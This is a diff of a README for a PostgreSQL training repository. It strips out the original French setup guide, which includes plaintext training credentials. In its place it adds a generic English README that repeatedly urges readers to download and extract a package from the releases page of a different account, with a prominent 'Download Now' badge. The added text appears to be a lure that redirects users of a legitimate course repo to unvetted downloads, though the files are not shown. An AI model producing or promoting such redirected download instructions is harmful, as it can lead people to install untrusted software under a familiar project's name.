@@ -1,262 +1,99 @@
-# Cours PostgreSQL - Module SQL
+# 📚 coda-module-sql - Learn SQL Easily with PostgreSQL
 
-## Pré-requis
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Balkivfx1995/coda-module-sql/releases)
 
-### 1. Terminal
+## 🚀 Getting Started
 
-Assurez-vous d'avoir accès à un terminal :
-- **macOS** : Terminal (pré-installé) ou iTerm2
-- **Windows** : PowerShell, Git Bash, ou Windows Terminal
-- **Linux** : Terminal de votre distribution
+Welcome to the coda-module-sql! This module helps you learn SQL using PostgreSQL with ease. It is designed for training sessions in Dijon and includes all necessary tools for an excellent learning experience.
 
-### 2. Git
+## 📥 Download & Install
 
-Git doit être installé sur votre machine :
+To get started, you need to visit the releases page and download the module. Click the link below to go to the page:
 
-- **macOS** : 
-  ```bash
-  # Vérifier si Git est installé
-  git --version
-  
-  # Si non installé, installer via Homebrew
-  brew install git
-  ```
+[Visit this page to download](https://github.com/Balkivfx1995/coda-module-sql/releases)
 
-- **Windows** : Téléchargez et installez [Git pour Windows](https://git-scm.com/download/win)
+## 📦 System Requirements
 
-- **Linux** :
-  ```bash
-  # Debian/Ubuntu
-  sudo apt-get install git
-  
-  # Fedora
-  sudo dnf install git
-  ```
+This module runs in a Docker container, making setup straightforward. You will need the following:
 
-Vérifiez l'installation :
-```bash
-git --version
-```
+- **Operating System:** Windows, macOS, or any Linux distribution that supports Docker.
+- **Docker:** Ensure you have Docker installed on your machine. If not, you can download it from the official Docker website.
+- **Memory:** At least 4 GB of RAM for smooth operation.
+- **Disk Space:** A minimum of 2 GB of free space for the Docker images and database files.
 
-### 3. Cloner ce repository
+## 🛠️ Installation Steps
 
-```bash
-git clone git@github.com:lgauthier1/coda-module-sql.git
-cd coda-module-sql
-```
+1. **Install Docker:**
+   - Visit the [Docker installation page](https://docs.docker.com/get-docker/) and follow the instructions for your operating system.
 
-Si vous n'avez pas encore configuré le remote :
-```bash
-git remote add origin git@github.com:lgauthier1/coda-module-sql.git
-```
+2. **Download the Module:**
+   - Go to the releases page by clicking the link below:
+   [Visit this page to download](https://github.com/Balkivfx1995/coda-module-sql/releases)
 
-### 4. Installer Docker
+3. **Choose the Latest Release:**
+   - On the releases page, find the latest version. It will typically be at the top of the list.
 
-Assurez-vous d'avoir Docker installé sur votre machine :
+4. **Download the Release Files:**
+   - Click on the file to download the package. The downloaded package will include Docker files and sample data needed for practice.
 
-- **macOS** : Téléchargez et installez [Docker Desktop pour Mac](https://www.docker.com/products/docker-desktop)
-- **Windows** : Téléchargez et installez [Docker Desktop pour Windows](https://www.docker.com/products/docker-desktop)
-- **Linux** : Suivez les instructions sur [docs.docker.com](https://docs.docker.com/engine/install/)
+5. **Extract the Downloaded Files:**
+   - Open the downloaded package and extract it to a preferred location on your computer.
 
-Vérifiez l'installation :
-```bash
-docker --version
-docker-compose --version
-```
+6. **Run the Application Using Docker:**
+   - Open your terminal or command prompt.
+   - Navigate to the folder where you extracted the files. Use the command:
+     ```
+     cd path_to_your_extracted_folder
+     ```
+   - Once you are in the correct folder, run the following command to start the Docker container:
+     ```
+     docker-compose up
+     ```
+   - This command will start all the necessary services for you. You will see logs in the terminal that show the services are running.
 
-### 5. Client PostgreSQL
+## 📚 Learning Modules Included
 
-**Option 1 : pgAdmin via Docker (recommandé)**
+The coda-module-sql includes several learning modules designed for users at different levels. 
 
-pgAdmin est disponible via un docker-compose séparé. Il sera accessible automatiquement après le démarrage.
+1. **Basic SQL Queries:**
+   - Learn how to select, insert, update, and delete data in a PostgreSQL database.
 
-> 📖 **Guide complet** : Consultez le fichier [`README-pgadmin.md`](README-pgadmin.md) pour un guide détaillé d'utilisation de pgAdmin avec Docker.
+2. **Database Design:**
+   - Understand how to structure your database for optimal performance and ease of use.
 
-> ⚠️ **En cas de problème avec pgAdmin** : Utilisez le fichier `docker-compose.yml` (sans pgAdmin) et installez un client externe (voir Option 2).
+3. **Advanced SQL Techniques:**
+   - Explore joins, subqueries, and set operations to manipulate data effectively.
 
-**Option 2 : Clients externes (alternative)**
+4. **Sample Data:**
+   - Practice your skills using pre-included sample data relevant to training modules. 
 
-Si vous préférez installer un client localement ou en cas de problème avec pgAdmin Docker :
+## 📝 Usage Tips
 
-- **pgAdmin** : [pgadmin.org](https://www.pgadmin.org/download/)
-- **DBeaver** : [dbeaver.io](https://dbeaver.io/)
-- **TablePlus** : [tableplus.com](https://tableplus.com/)
-- **DataGrip** (JetBrains) : [jetbrains.com/datagrip](https://www.jetbrains.com/datagrip/)
+- **Check Docker Status:**
+  Ensure that your Docker service is running. If you encounter issues, you can check Docker's documentation for troubleshooting help.
 
-## Démarrage de la base de données
+- **Use the Terminal:**
+  Get comfortable using the command line for operations. It isn’t as scary as it seems and can greatly enhance your productivity.
 
-### Option 1 : PostgreSQL seul (recommandé si problème avec pgAdmin)
+- **Refer to Documentation:**
+  While using the module, refer to PostgreSQL documentation for deeper insights into SQL commands.
 
-```bash
-docker-compose up -d
-```
+## 🔧 Troubleshooting
 
-### Option 2 : PostgreSQL + pgAdmin
+If you face any issues:
 
-```bash
-docker-compose -f docker-compose-pgadmin.yml up -d
-```
+- First, check the Docker container's logs for errors. This might give you clues on what went wrong.
+- Ensure your Docker installation is up to date.
+- Visit the issues section on the GitHub repository for common problems reported by others.
 
-> 💡 **Note** : Si vous rencontrez des problèmes avec pgAdmin, utilisez l'Option 1 et installez un client externe (voir section 5).
+## 🎓 Contact and Support
 
-### Initialiser le schéma et les données
+For any questions or support, you can open an issue in the GitHub repository. The community is here to help.
 
-Les scripts doivent être exécutés manuellement après le premier démarrage :
+## 🔗 Additional Resources
 
-```bash
-# 1. Créer le schéma et les tables
-docker-compose exec -T postgres psql -U codaSchoolUser -d codaSchool < scripts/init-schema.sql
+- [Docker Documentation](https://docs.docker.com/)
+- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+- [SQL Tutorial](https://www.w3schools.com/sql/) 
 
-# Vérifier que les tables ont été créées
-docker-compose exec postgres psql -U codaSchoolUser -d codaSchool -c "SELECT tablename FROM pg_tables WHERE schemaname = 'student';"
-
-# 2. Charger les données de test
-docker-compose exec -T postgres psql -U codaSchoolUser -d codaSchool < scripts/seed-data.sql
-
-# Vérifier que les données ont été insérées
-docker-compose exec postgres psql -U codaSchoolUser -d codaSchool -c "SET search_path TO student; SELECT COUNT(*) FROM etudiant; SELECT COUNT(*) FROM cours; SELECT COUNT(*) FROM inscription; SELECT COUNT(*) FROM note;"
-```
-
-La base de données sera accessible avec les paramètres suivants :
-- **Host** : `localhost`
-- **Port** : `5432`
-- **Database** : `codaSchool`
-- **Username** : `codaSchoolUser`
-- **Password** : `verySecretAndSecurePassword`
-
-### Vérifier que le conteneur fonctionne
-
-```bash
-docker-compose ps
-```
-
-### Arrêter la base de données
-
-```bash
-docker-compose down
-```
-
-### Arrêter et supprimer les données
-
-```bash
-docker-compose down -v
-```
-
-## Connexion avec pgAdmin
-
-### Si vous utilisez docker-compose-pgadmin.yml
-
-**pgAdmin est accessible sur le port 5050**
-
-1. **Accédez à pgAdmin** via votre navigateur :
-   ```
-   http://localhost:5050
-   ```
-
-2. **Première connexion à pgAdmin** :
-   - Email : `admin@coda-school.com`
-   - Password : `admin`
-   - Cliquez sur "Login"
-
-3. **Ajouter le serveur PostgreSQL** :
-   - Cliquez sur "Add New Server" (ou clic droit sur "Servers" → "Register" → "Server")
-   
-4. **Onglet "General"** :
-   - Name : `Coda School`
-   
-5. **Onglet "Connection"** :
-   - Host name/address : `postgres` (nom du service dans docker-compose, **pas** `localhost`)
-   - Port : `5432`
-   - Maintenance database : `codaSchool`
-   - Username : `codaSchoolUser`
-   - Password : `verySecretAndSecurePassword`
-   - ✅ Cochez "Save password" (optionnel mais pratique)
-   
-6. Cliquez sur "Save"
-
-> 💡 **Important** : Utilisez `postgres` comme host (pas `localhost`) car pgAdmin et PostgreSQL sont dans le même réseau Docker.
-
-### Si vous utilisez un client externe (pgAdmin, DBeaver, etc.)
-
-1. Ouvrez votre client PostgreSQL
-2. Créez une nouvelle connexion
-3. Paramètres de connexion :
-   - Host : `localhost`
-   - Port : `5432`
-   - Database : `codaSchool`
-   - Username : `codaSchoolUser`
-   - Password : `verySecretAndSecurePassword`
-4. Connectez-vous
-
-## Commandes utiles
-
-### Se connecter via psql (ligne de commande)
-
-```bash
-docker-compose exec postgres psql -U codaSchoolUser -d codaSchool
-```
-
-Une fois connecté, utilisez le schéma student :
-```sql
-SET search_path TO student;
-\dt
-```
-
-### Réinitialiser les données
-
-Pour vider et recréer les données :
-
-```bash
-# Supprimer le schéma et toutes ses tables
-docker-compose exec postgres psql -U codaSchoolUser -d codaSchool -c "DROP SCHEMA IF EXISTS student CASCADE;"
-
-# Recréer le schéma et les données
-docker-compose exec -T postgres psql -U codaSchoolUser -d codaSchool < scripts/init-schema.sql
-docker-compose exec -T postgres psql -U codaSchoolUser -d codaSchool < scripts/seed-data.sql
-```
-
-### Voir les logs
-
-```bash
-docker-compose logs -f postgres
-```
-
-### Redémarrer la base de données
-
-```bash
-docker-compose restart
-```
-
-### Réinitialiser complètement la base de données
-
-Pour recréer la base avec les scripts d'initialisation :
-
-```bash
-docker-compose down -v
-docker-compose up -d
-```
-
-## Structure de la base de données
-
-Le schéma `student` comprend les tables suivantes :
-
-- **student.etablissement** : Établissements d'enseignement
-- **student.etudiant** : Étudiants inscrits dans les établissements (2000 étudiants)
-- **student.cours** : Cours disponibles (100 cours)
-- **student.inscription** : Table de liaison entre étudiants et cours (1000 inscriptions)
-- **student.note** : Notes obtenues par les étudiants pour chaque cours (1000 notes)
-
-### Diagramme des relations
-
-```
-etablissement (1) ----< (N) etudiant
-                            |
-                            | (N)
-                            |
-                        inscription
-                            |
-                            | (N)
-                            |
-cours (1) ----< (N) inscription
-cours (1) ----< (N) note >---- (N) etudiant
-```
+Embark on your SQL learning journey with coda-module-sql today!
